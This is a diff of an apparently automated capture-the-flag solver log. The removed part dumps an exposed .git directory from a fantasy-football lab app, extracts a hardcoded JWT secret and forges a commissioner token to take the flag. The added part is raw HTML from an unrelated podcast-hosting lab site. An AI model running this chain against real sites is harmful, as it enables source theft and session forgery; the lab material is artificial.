@@ -1,229 +1,427 @@
-$ /usr/bin/python3 -m pip install --quiet git-dumper || pip install --quiet git-dumper
 
-$ git-dumper https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/ dump
-9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/HEAD [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/staging [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/production [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/development [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/stash [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/main [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/master [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/staging [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/master [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/remotes/origin/main [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/production [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/wtree/refs/heads/development [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/main [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/master [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/staging [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/production [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/refs/wip/index/refs/heads/development [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/HEAD [200]
-[-] Finding packs
-[-] Finding objects
-[-] Fetching objects
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/3e/0eb9966c0cc45d26b004a1bb1eebf8731d8bc6 [200]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/b5/44a7b93d2777c7fb68676cc313d3e5cbbaad76 [200]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/91/d16407f665a6fe30620652ac2d679802bdad82 [200]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/0b/7202628ed321f4d2ef4b3002849dc5bfdc744a [200]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/a1/70e0096347c40b569e0bce5aa7849e439ae5c2 [200]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/e7/8bd8685d55257e03865325f43ff1f6988c5ac7 [200]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/00/00000000000000000000000000000000000000 [404]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/cd/2dbe4e533c0addafae7f3c6b1af2dd26abd5ed [200]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/3c/bdbeaab478e0e60d6ce8907df9b34411ceb4f6 [200]
-[-] Fetching https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com/.git/objects/4a/aae91cae27ead966437c8869a2e9768ebd2339 [200]
-[-] Running git checkout .
-
-
-########## RECOVERED FILES ##########
-dump/.gitignore 50
-dump/server.js 8684
-dump/package.json 303
-dump/config/secret.js 192
-dump/public/site.css 5561
-$ cd dump && git checkout -- . 2>/dev/null; git checkout HEAD -- . 2>/dev/null; git reset --hard 2>/dev/null; ls -la
-HEAD is now at 3e0eb99 Deploy WorldOutter league app
-total 40
-drwxr-xr-x 5 runner runner 4096 Sep 26 05:45 .
-drwxr-xr-x 7 runner runner 4096 Sep 26 05:45 ..
-drwxr-xr-x 7 runner runner 4096 Sep 26 05:45 .git
--rw-r--r-- 1 runner runner   50 Sep 26 05:45 .gitignore
-drwxr-xr-x 2 runner runner 4096 Sep 26 05:45 config
--rw-r--r-- 1 runner runner  303 Sep 26 05:45 package.json
-drwxr-xr-x 2 runner runner 4096 Sep 26 05:45 public
--rw-r--r-- 1 runner runner 8684 Sep 26 05:45 server.js
-
-
-########## SOURCE DUMPS ##########
-
-===== dump/server.js (8684 bytes) =====
-'use strict';
-// WorldOutter - fantasy football league. The session cookie (wo_session) is an
-// HS256 JWT signed with JWT_SECRET from config/secret.js. That secret is also
-// committed into the .git repo the deploy left served at /.git, so it can be
-// recovered and used to forge a {role:"commissioner"} token, which unlocks the
-// Commissioner console where the league's private key (the flag) is shown.
-const express = require('express');
-const cookieParser = require('cookie-parser');
-const jwt = require('jsonwebtoken');
-const path = require('path');
-
-const { JWT_SECRET } = require('./config/secret');
-const FLAG = process.env.FLAG || 'WEBVERSE{worldoutter_local}';
-const LEAGUE = 'Founders Dynasty League';
-
-const app = express();
-app.disable('x-powered-by');
-app.use(cookieParser());
-
-// The deploy pushed the whole repo, so the .git directory is served. Directory
-// listing is off (express.static does not autoindex); the object store is
-// reachable, which is the exposure.
-app.use('/.git', express.static(path.join(__dirname, '.git'), { dotfiles: 'allow', index: false, redirect: false }));
-app.use('/public', express.static(path.join(__dirname, 'public'), { index: false }));
-
-// Every visitor is a league member. Issue a signed member session if absent.
-app.use((req, res, next) => {
-  let claims = null;
-  if (req.cookies.wo_session) {
-    try { claims = jwt.verify(req.cookies.wo_session, JWT_SECRET, { algorithms: ['HS256'] }); } catch (e) { claims = null; }
-  }
-  if (!claims) {
-    claims = { user: 'you', team: 'Gridiron Gophers', role: 'member' };
-    res.cookie('wo_session', jwt.sign(claims, JWT_SECRET, { algorithm: 'HS256' }), { httpOnly: true, sameSite: 'lax' });
-  }
-  req.claims = claims;
-  next();
-});
-
-const STANDINGS = [
-  ['Riverside Ramblers', 'M. Ellis', 7, 1, 1043.5, 872.1],
-  ['Copperton Cobras', 'D. Nkemdirim', 6, 2, 998.2, 910.7],
-  ['Vale Vanguard', 'S. Okafor', 5, 3, 964.0, 933.4],
-  ['Gridiron Gophers', 'You', 5, 3, 951.8, 940.3],
-  ['Harbor Hphins', 'T. Alvarez', 4, 4, 902.6, 918.9],
-  ['Ninth Street Nine', 'K. Brandt', 3, 5, 878.3, 951.2],
-  ['Dust Bowl Diesel', 'R. Whitlock', 2, 6, 845.1, 989.5],
-  ['Lowland Larks', 'P. Devi', 2, 6, 831.7, 1002.0],
-];
-const MATCHUPS = [
-  ['Riverside Ramblers', 138.4, 'Ninth Street Nine', 121.7],
-  ['Gridiron Gophers', 129.9, 'Harbor Hphins', 116.2],
-  ['Copperton Cobras', 141.0, 'Lowland Larks', 108.8],
-  ['Vale Vanguard', 133.5, 'Dust Bowl Diesel', 125.1],
-];
-const ROSTER = [
-  ['QB', 'Marcus Vance', 'CPT', 22.4, 24.8],
-  ['RB', 'Deon Hartley', 'RIV', 18.1, 15.6],
-  ['RB', 'Isaiah Crook', 'VAL', 14.7, 12.2],
-  ['WR', 'Tobias Reyes', 'CPT', 20.9, 17.4],
-  ['WR', 'Andre Salloum', 'HRB', 12.3, 13.9],
-  ['TE', 'Grant Mueller', 'NIN', 9.8, 8.1],
-  ['FLEX', 'Cole Barrentine', 'DUS', 11.2, 10.5],
-  ['K', 'Petar Kovac', 'VAL', 8.0, 7.5],
-  ['DEF', 'Copperton D/ST', 'CPT', 10.0, 9.2],
-];
-const h = (s) => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
-
-function layout(title, active, body) {
-  const nav = [['/', 'My Team', 'team'], ['/league', 'League', 'league'], ['/players', 'Players', 'players'], ['/scores', 'Scores', 'scores']];
-  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>${h(title)} - WorldOutter</title><link rel="stylesheet" href="/public/site.css"></head><body>
-<header class="wo-top"><div class="wo-top__in">
-  <a class="wo-logo" href="/">WORLD<span>OUTTER</span></a>
-  <nav class="wo-nav">${nav.map(n => `<a class="${active===n[2]?'is-active':''}" href="${n[0]}">${n[1]}</a>`).join('')}</nav>
-  <div class="wo-top__r"><span class="wo-week">Week 9</span><span class="wo-league">${h(LEAGUE)}</span><a class="wo-gear" href="/commissioner" title="Commissioner">&#9881;</a></div>
-</div></header>
-<div class="wo-sub"><div class="wo-sub__in"><span class="wo-sub__team">Gridiron Gophers</span><span class="wo-sub__rec">Season 2026 &middot; PPR &middot; 10-team</span></div></div>
-<main class="wo-main">${body}</main>
-<footer class="wo-foot">WorldOutter Fantasy &middot; ${h(LEAGUE)} &middot; Not affiliated with any professional league</footer>
-</body></html>`;
-}
-
-app.get('/', (req, res) => {
-  const mine = MATCHUPS[1];
-  const body = `
-  <div class="wo-grid">
-    <section class="wo-panel">
-      <div class="wo-panel__h">Your matchup - Week 9</div>
-      <div class="wo-match">
-        <div class="wo-match__side"><span class="wo-match__team">${h(mine[0])}</span><span class="wo-match__pts">${mine[1]}</span></div>
-        <span class="wo-match__vs">vs</span>
-        <div class="wo-match__side wo-match__side--opp"><span class="wo-match__team">${h(mine[2])}</span><span class="wo-match__pts">${mine[3]}</span></div>
+################ RAW / status 200 ################
+Set-Cookie: td_session=s%3ARerLSc0NZWZYrCxDQBL8IdlymzwN9sTq.rnljdc2vmJaQ042ACvi0nKheZlrilcppkNm%2FNMHjXRw; Path=/; HttpOnly; SameSite=Lax
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Tapedeck — Podcast hosting for people who take the show seriously</title>
+  <link rel="stylesheet" href="/public/css/site.css">
+  <link rel="icon" href="data:,">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <a class="brand" href="/">
+        <span class="brand-mark"></span>
+        <span class="brand-word">Tapedeck</span>
+      </a>
+      <nav class="nav-links">
+        <a href="/features" class="">Features</a>
+        <a href="/pricing"  class="">Pricing</a>
+        <a href="/about"    class="">About</a>
+      </nav>
+      <div class="nav-cta">
+        <a class="btn btn-ghost" href="/studio">Sign in</a>
+        <a class="btn btn-solid" href="/studio">Open Studio</a>
       </div>
-      <p class="wo-win">Win probability <strong>68%</strong> &middot; Projected ${mine[1]} - 118.0</p>
-    </section>
-    <section class="wo-panel">
-      <div class="wo-panel__h">Starting lineup</div>
-      <table class="wo-tbl"><thead><tr><th>Slot</th><th>Player</th><th>Team</th><th>Proj</th><th>Pts</th></tr></thead><tbody>
-      ${ROSTER.map(r => `<tr><td class="wo-slot">${r[0]}</td><td>${h(r[1])}</td><td class="wo-mono">${h(r[2])}</td><td class="wo-mono">${r[3]}</td><td class="wo-mono wo-live">${r[4]}</td></tr>`).join('')}
-      </tbody></table>
-    </section>
-  </div>`;
-  res.send(layout('My Team', 'team', body));
-});
-
-app.get('/league', (req, res) => {
-  const body = `<section class="wo-panel">
-    <div class="wo-panel__h">League standings</div>
-    <table class="wo-tbl wo-tbl--stand"><thead><tr><th>#</th><th>Team</th><th>Manager</th><th>W</th><th>L</th><th>PF</th><th>PA</th></tr></thead><tbody>
-    ${STANDINGS.map((s, i) => `<tr class="${s[1]==='You'?'is-me':''}"><td class="wo-mono">${i+1}</td><td>${h(s[0])}</td><td class="wo-dim">${h(s[1])}</td><td class="wo-mono">${s[2]}</td><td class="wo-mono">${s[3]}</td><td class="wo-mono">${s[4]}</td><td class="wo-mono">${s[5]}</td></tr>`).join(
-  >> FLAG-LIKE: WEBVERSE{worldoutter_local}
-
-===== dump/package.json (303 bytes) =====
-{
-  "name": "worldoutter",
-  "version": "1.0.0",
-  "private": true,
-  "description": "WorldOutter fantasy football league",
-  "main": "server.js",
-  "scripts": { "start": "node server.js" },
-  "dependencies": {
-    "express": "^4.19.2",
-    "jsonwebtoken": "^9.0.2",
-    "cookie-parser": "^1.4.6"
-  }
-}
-
-
-===== dump/config/secret.js (192 bytes) =====
-// Session signing secret for WorldOutter league auth.
-// TODO(dev): pull this from a real secret manager before we scale.
-module.exports = { JWT_SECRET: 'd56948fbb905ee6fb9a45840fdf131c8' };
-
-  >> POSSIBLE SECRET: JWT_SECRET: 'd56948fbb905ee6fb9a45840fdf131c8'
-
-########## GREP ##########
-$ grep -rniE 'secret|flag\{|zdk\{|commissioner|jwt|sign' dump --include='*.js' --include='*.json' --include='*.env' --include='*.ts' --include='*.txt' 2>/dev/null | grep -viv '' | head -80
-
-
-DETECTED SECRET: 'd56948fbb905ee6fb9a45840fdf131c8'
-member payload: {'user': 'you', 'team': 'Gridiron Gophers', 'role': 'member', 'iat': 1790401552}
-
-=== secret='d56948fbb905ee6fb9a45840fdf131c8' status=200 denied=False ===
-COOKIE: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91IiwidGVhbSI6IkdyaWRpcm9uIEdvcGhlcnMiLCJyb2xlIjoiY29tbWlzc2lvbmVyIiwiaWF0IjoxNzkwNDAxNTUyfQ.57bIDmfetgU64JmRfvF4RA9ezqUW1VGsZ3XqjZtb_yU
-*** ACCESS GRANTED ***
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Commissioner - WorldOutter</title><link rel="stylesheet" href="/public/site.css"></head><body>
-<header class="wo-top"><div class="wo-top__in">
-  <a class="wo-logo" href="/">WORLD<span>OUTTER</span></a>
-  <nav class="wo-nav"><a class="" href="/">My Team</a><a class="" href="/league">League</a><a class="" href="/players">Players</a><a class="" href="/scores">Scores</a></nav>
-  <div class="wo-top__r"><span class="wo-week">Week 9</span><span class="wo-league">Founders Dynasty League</span><a class="wo-gear" href="/commissioner" title="Commissioner">&#9881;</a></div>
-</div></header>
-<div class="wo-sub"><div class="wo-sub__in"><span class="wo-sub__team">Gridiron Gophers</span><span class="wo-sub__rec">Season 2026 &middot; PPR &middot; 10-team</span></div></div>
-<main class="wo-main"><section class="wo-panel">
-    <div class="wo-panel__h">Commissioner console</div>
-    <p class="wo-comm__lead">Welcome, Commissioner. These controls affect every team in Founders Dynasty League.</p>
-    <div class="wo-comm__grid">
-      <div class="wo-comm__card"><h4>Edit scoring settings</h4><p>PPR, bonuses, and stat corrections.</p></div>
-      <div class="wo-comm__card"><h4>Process trades</h4><p>Approve or veto pending trades.</p></div>
-      <div class="wo-comm__card"><h4>Manage members</h4><p>Invite, remove, and reassign teams.</p></div>
     </div>
-    <div class="wo-comm__key"><span>League API key (keep private)</span><code>WEBVERSE{f706ffc443beace02eea1afe2ca0a142}</code></div>
-  </section></main>
-<footer class="wo-foot">WorldOutter Fantasy &middot; Founders Dynasty League &middot; Not affiliated with any professional league</footer>
-<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"b555bf0b6ced40d5b5d7fd21b269244b","r":1,"spa":2}' crossorigin="anonymous"></script>
-<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a40ff7057e2df7a9',t:'MTc5MDQwMTU1Mg=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>
-FLAGS: ['WEBVERSE{f706ffc443beace02eea1afe2ca0a142}']
+  </header>
+  <main>
 
-DONE, secret= 'd56948fbb905ee6fb9a45840fdf131c8'
+
+<section class="hero">
+  <div class="wrap hero-inner">
+    <div class="hero-copy">
+      <span class="eyebrow">Podcast hosting</span>
+      <h1>Host the show. Grow the audience. Keep the rights.</h1>
+      <p>Tapedeck is calm, dependable podcast hosting with honest analytics, private feeds, and one-click audiograms. No lock-in, no gimmicks, no ads read by a robot.</p>
+      <div class="hero-cta">
+        <a class="btn btn-solid" href="/studio">Open the Studio</a>
+        <a class="btn btn-ghost" href="/features">See features</a>
+      </div>
+      <div class="hero-stats">
+        <div><span class="n mono">14k</span><span class="l">shows hosted</span></div>
+        <div><span class="n mono">120M</span><span class="l">downloads a month</span></div>
+        <div><span class="n mono">99.98%</span><span class="l">delivery uptime</span></div>
+      </div>
+    </div>
+    <div class="hero-art">
+      <img src="/public/img/studio.jpg" alt="A home podcast studio with a microphone">
+    </div>
+  </div>
+</section>
+
+<section class="band">
+  <div class="wrap">
+    <div class="band-head"><span class="eyebrow">Why Tapedeck</span><h2>Everything the show needs, nothing it does not</h2></div>
+    <div class="grid-3">
+      <div class="card"><h3>Reliable hosting</h3><p>Your RSS feed, distribution to every major app, and delivery that does not flinch on release day.</p></div>
+      <div class="card"><h3>Honest analytics</h3><p>IAB-certified numbers you can trust, per episode and over time, without vanity inflation.</p></div>
+      <div class="card"><h3>Audiograms</h3><p>Turn a clip into a shareable waveform poster in the Studio, on brand, ready for social.</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="feature-row">
+  <div class="wrap split">
+    <img src="/public/img/mic.jpg" alt="A studio control room">
+    <div>
+      <span class="eyebrow">The Studio</span>
+      <h2>Share the best sixty seconds</h2>
+      <p>Drop in a clip, pick a look, and Tapedeck renders a clean waveform audiogram you can post anywhere. It is the fastest way to turn a good moment into new listeners.</p>
+      <a class="btn btn-solid" href="/studio">Make an audiogram</a>
+    </div>
+  </div>
+</section>
+
+  </main>
+  <footer class="foot">
+    <div class="wrap foot-inner">
+      <div class="foot-brand">
+        <span class="brand-mark"></span>
+        <span>Tapedeck</span>
+        <p class="foot-tag">Podcast hosting, analytics, and shareable audiograms. Independent since 2016.</p>
+      </div>
+      <div class="foot-col"><h4>Product</h4><a href="/features">Features</a><a href="/pricing">Pricing</a><a href="/studio">Studio</a></div>
+      <div class="foot-col"><h4>Company</h4><a href="/about">About</a><a href="/about">Careers</a><a href="/about">Contact</a></div>
+      <div class="foot-col"><h4>Creators</h4><a href="/studio">Open Studio</a><a href="/features">Audiograms</a><a href="/pricing">Plans</a></div>
+    </div>
+    <div class="foot-rule"><div class="wrap">&copy; 2016&ndash;2026 Tapedeck Media. Hosting for people who take the show seriously.</div></div>
+  </footer>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"b555bf0b6ced40d5b5d7fd21b269244b","r":1,"spa":2}' crossorigin="anonymous"></script>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a4105835ce826b22',t:'MTc5MDQwNTUzMw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
+
+
+
+################ RAW /studio status 200 ################
+Set-Cookie: td_session=s%3Aw55kd-lit1q7utZLhZCEiBrHgEDB1lGo.n5uKOqgwG8T4FHaoetubQELgz6%2F0VHCcgiNWTKUVeCk; Path=/; HttpOnly; SameSite=Lax
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Studio — Tapedeck</title>
+  <link rel="stylesheet" href="/public/css/site.css">
+  <link rel="icon" href="data:,">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <a class="brand" href="/">
+        <span class="brand-mark"></span>
+        <span class="brand-word">Tapedeck</span>
+      </a>
+      <nav class="nav-links">
+        <a href="/features" class="">Features</a>
+        <a href="/pricing"  class="">Pricing</a>
+        <a href="/about"    class="">About</a>
+      </nav>
+      <div class="nav-cta">
+        <a class="btn btn-ghost" href="/studio">Sign in</a>
+        <a class="btn btn-solid" href="/studio">Open Studio</a>
+      </div>
+    </div>
+  </header>
+  <main>
+
+
+<section class="studio">
+  <div class="wrap">
+    <div class="studio-head">
+      <div>
+        <span class="eyebrow">Clip Studio</span>
+        <h1>Turn a clip into an audiogram</h1>
+        <p>Upload a short piece of audio and Tapedeck renders a shareable waveform poster. Name your export, pick a look, and download it for social.</p>
+      </div>
+      <div class="studio-ws">Workspace <span class="mono">cdf0ab</span></div>
+    </div>
+
+    
+
+    <div class="studio-grid">
+      <div class="panel">
+        <h2>1. Upload a clip</h2>
+        <p class="sub">MP3, WAV, or M4A. Up to 12 MB, we use the first 20 seconds.</p>
+        <form method="post" action="/studio/upload" enctype="multipart/form-data" class="uploader">
+          <input type="file" name="clip" accept="audio/*" required>
+          <button class="btn btn-solid" type="submit">Upload clip</button>
+        </form>
+        
+      </div>
+
+      <div class="panel">
+        <h2>2. Render the audiogram</h2>
+        <p class="sub">The export name is used as the poster filename.</p>
+        <form id="renderForm" class="renderer">
+          <label class="field"><span>Export name</span>
+            <input id="slugInput" name="slug" value="audiogram" autocomplete="off" spellcheck="false">
+          </label>
+          <label class="field"><span>Look</span>
+            <select id="themeSelect" name="theme">
+              <option value="midnight">Midnight</option>
+              <option value="ink">Ink</option>
+              <option value="slate">Slate</option>
+              <option value="moss">Moss</option>
+            </select>
+          </label>
+          <button id="renderBtn" class="btn btn-solid" type="submit" disabled>Render audiogram</button>
+          <span id="renderStatus" class="render-status"></span>
+        </form>
+      </div>
+    </div>
+
+    <div class="panel posters">
+      <h2>Your audiograms</h2>
+      <p id="postersEmpty" class="sub empty" >Rendered audiograms show up here, ready to download.</p>
+      <div id="posterGrid" class="poster-grid" hidden>
+        
+      </div>
+    </div>
+  </div>
+</section>
+
+<script>
+  (function () {
+    var form = document.getElementById('renderForm');
+    if (!form) return;
+    var btn = document.getElementById('renderBtn');
+    var status = document.getElementById('renderStatus');
+    var grid = document.getElementById('posterGrid');
+    var empty = document.getElementById('postersEmpty');
+
+    function addPoster(o) {
+      if (grid.querySelector('[data-file="' + (window.CSS && CSS.escape ? CSS.escape(o.file) : o.file) + '"]')) return;
+      var a = document.createElement('a');
+      a.className = 'poster';
+      a.setAttribute('data-file', o.file);
+      a.href = o.url; a.target = '_blank'; a.rel = 'noopener';
+      var img = document.createElement('img');
+      img.src = o.url; img.alt = 'Audiogram ' + o.file;
+      var name = document.createElement('span');
+      name.className = 'poster-name mono'; name.textContent = o.file;
+      a.appendChild(img); a.appendChild(name);
+      grid.insertBefore(a, grid.firstChild);
+    }
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      btn.disabled = true;
+      status.textContent = 'Rendering...';
+      fetch('/api/render', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          slug: document.getElementById('slugInput').value,
+          theme: document.getElementById('themeSelect').value
+        })
+      })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          // Note: the API also returns an `errors` field on failure. The Studio
+          // does not surface it here.
+          var outs = (data && data.outputs) || [];
+          if (outs.length) {
+            empty.hidden = true; grid.hidden = false;
+            outs.forEach(addPoster);
+            status.textContent = 'Rendered.';
+          } else {
+            status.textContent = 'Nothing to render.';
+          }
+        })
+        .catch(function () { status.textContent = 'Nothing to render.'; })
+        .then(function () { btn.disabled = false; });
+    });
+  })();
+</script>
+
+  </main>
+  <footer class="foot">
+    <div class="wrap foot-inner">
+      <div class="foot-brand">
+        <span class="brand-mark"></span>
+        <span>Tapedeck</span>
+        <p class="foot-tag">Podcast hosting, analytics, and shareable audiograms. Independent since 2016.</p>
+      </div>
+      <div class="foot-col"><h4>Product</h4><a href="/features">Features</a><a href="/pricing">Pricing</a><a href="/studio">Studio</a></div>
+      <div class="foot-col"><h4>Company</h4><a href="/about">About</a><a href="/about">Careers</a><a href="/about">Contact</a></div>
+      <div class="foot-col"><h4>Creators</h4><a href="/studio">Open Studio</a><a href="/features">Audiograms</a><a href="/pricing">Plans</a></div>
+    </div>
+    <div class="foot-rule"><div class="wrap">&copy; 2016&ndash;2026 Tapedeck Media. Hosting for people who take the show seriously.</div></div>
+  </footer>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a41058399f8cec2e',t:'MTc5MDQwNTUzMw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"b555bf0b6ced40d5b5d7fd21b269244b","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
+
+
+
+################ RAW /features status 200 ################
+Set-Cookie: td_session=s%3AzHQ7DcQBOIQygh7H6dsJxK7fz-rideXx.8H5WsftvVrlnQcpHoJ4kYCCEkAuu1mvwNVn2pVEehJQ; Path=/; HttpOnly; SameSite=Lax
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Features — Tapedeck</title>
+  <link rel="stylesheet" href="/public/css/site.css">
+  <link rel="icon" href="data:,">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <a class="brand" href="/">
+        <span class="brand-mark"></span>
+        <span class="brand-word">Tapedeck</span>
+      </a>
+      <nav class="nav-links">
+        <a href="/features" class="on">Features</a>
+        <a href="/pricing"  class="">Pricing</a>
+        <a href="/about"    class="">About</a>
+      </nav>
+      <div class="nav-cta">
+        <a class="btn btn-ghost" href="/studio">Sign in</a>
+        <a class="btn btn-solid" href="/studio">Open Studio</a>
+      </div>
+    </div>
+  </header>
+  <main>
+
+<section class="page">
+  <div class="wrap">
+    <div class="page-head"><span class="eyebrow">Features</span><h1>Built for the long-running show</h1><p>The essentials done well, and the extras that actually move the needle.</p></div>
+    <div class="grid-3">
+      <div class="card"><h3>Unlimited hosting</h3><p>Upload as much as you record. Every plan includes unlimited storage and bandwidth.</p></div>
+      <div class="card"><h3>One feed, every app</h3><p>Automatic distribution to Apple Podcasts, Spotify, YouTube, and the rest, from a single RSS feed you own.</p></div>
+      <div class="card"><h3>Private feeds</h3><p>Members-only and internal shows with per-listener feeds and revocable access.</p></div>
+      <div class="card"><h3>Audiograms</h3><p>Render waveform posters from any clip in the Studio, sized for every platform.</p></div>
+      <div class="card"><h3>Team seats</h3><p>Editors, hosts, and guests collaborate with roles that make sense.</p></div>
+      <div class="card"><h3>Dynamic insertion</h3><p>Drop and swap sponsor reads without re-uploading the episode.</p></div>
+    </div>
+  </div>
+</section>
+  </main>
+  <footer class="foot">
+    <div class="wrap foot-inner">
+      <div class="foot-brand">
+        <span class="brand-mark"></span>
+        <span>Tapedeck</span>
